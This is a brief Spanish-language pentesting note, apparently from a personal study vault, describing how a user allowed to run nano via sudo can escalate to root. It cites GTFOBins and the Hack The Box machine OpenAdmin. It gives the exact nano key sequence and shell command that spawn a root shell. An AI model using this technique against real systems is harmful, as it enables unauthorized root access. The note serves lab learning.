
## DESCRIPTION

Si un suario puede ejecutar "nano" como sudo --> puede escarlar privilegios a root

#### More information
*  https://gtfobins.github.io/gtfobins/nano/
## EXPLOITATION

1. Enumeration
![[Pasted image 20230112182810.png]]
2. Utilizamos --> https://gtfobins.github.io/gtfobins/nano/
![[Pasted image 20230112182954.png]]
En nuestro caso tenemos que usar el comando del sudoers completo: 

````
sudo /bin/nano /opt/priv
^R^X
reset; sh 1>&0 2>&0
````

3. 
![[Pasted image 20230112183146.png]]


**!!NOTA IMPORTANTE!!**  Cuidado con la shell del nc que puede dar el siguiente error --> buscar otra shell alternativa

![[Pasted image 20230112192340.png]]


## MACHINES 

* Hack The Box: OPENADMIN